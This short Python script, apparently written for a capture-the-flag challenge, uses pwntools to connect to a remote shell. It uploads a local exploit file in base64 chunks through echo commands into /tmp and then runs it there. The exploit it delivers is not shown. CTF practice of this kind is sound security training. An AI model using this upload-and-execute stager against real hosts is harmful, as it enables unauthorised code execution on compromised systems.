#!/usr/bin/env python3

# sometimes needed to be launched several times 

from pwn import *

context.log_level = logging.DEBUG

HOST = 'flu.xxx'
PORT = 11201

with open('solve.py', 'rb') as f:
  exploit_data = f.read()

p = remote(HOST, PORT)

info('Sending exploit...')
chunk_size = 128
for i in range(0, len(exploit_data), chunk_size):
    c = b64e(exploit_data[i:i+chunk_size])
    p.sendlineafter('$ ', 'echo %s | base64 -d >> /tmp/solve.py' % c)
    info(f'{100 * i // len(exploit_data)}%')

info('Launching exploit...')

p.sendlineafter('$ ', b'python3 /tmp/solve.py', timeout=2)
info(p.recvuntil('$'))